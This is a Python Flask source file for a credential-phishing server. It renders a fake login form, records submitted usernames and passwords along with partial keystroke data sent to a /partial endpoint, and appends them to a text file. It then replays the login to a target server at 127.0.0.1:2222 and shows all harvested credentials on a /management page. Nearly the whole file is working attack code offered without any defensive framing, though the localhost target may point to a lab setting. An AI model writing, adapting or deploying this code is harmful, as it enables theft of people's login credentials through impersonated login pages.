import time

import requests
from flask import Flask, json, redirect, render_template, request, url_for

app = Flask(__name__)
target = 'http://127.0.0.1:2222'

def capture_credentials(username, password):
    print(username, password)
    with open('credentials_partial.txt', 'a') as f:
        f.write(f'[{time.time()}] {username if username else "Unavailable"}:{password if password else "Unavailable"}\n')

@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Get username + password from login form, record to file, and then redirect to real page
        username, password = [request.form.get('username'), request.form.get('password')]
        capture_credentials(username, password)
        redirect(target)

        return redirect(requests.post(target, data={'username': username, 'password': password}).url, code=307)

    # Render the fake login form
    return render_template('index_keystrokes.html')

@app.route("/partial", methods=['POST'])
def partial():
    if request.method == 'POST':
        data = json.loads(request.data)
        keys = data.keys()

        username = ''
        password = ''

        if 'username' in keys:
            username = data['username']
        if 'password' in keys:
            password = data['password']

        capture_credentials(username, password)
        return { 'message': 'OK' }

    return { 'message': 'Method not allowed' }
        

@app.route('/management', methods=['GET'])
def management():
    # Render the credentials viewer page
    with open('credentials_partial.txt', 'r') as f:
        credentials = f.read().splitlines()
        return render_template('management.html', credentials=credentials)

if __name__ == "__main__":
    app.run()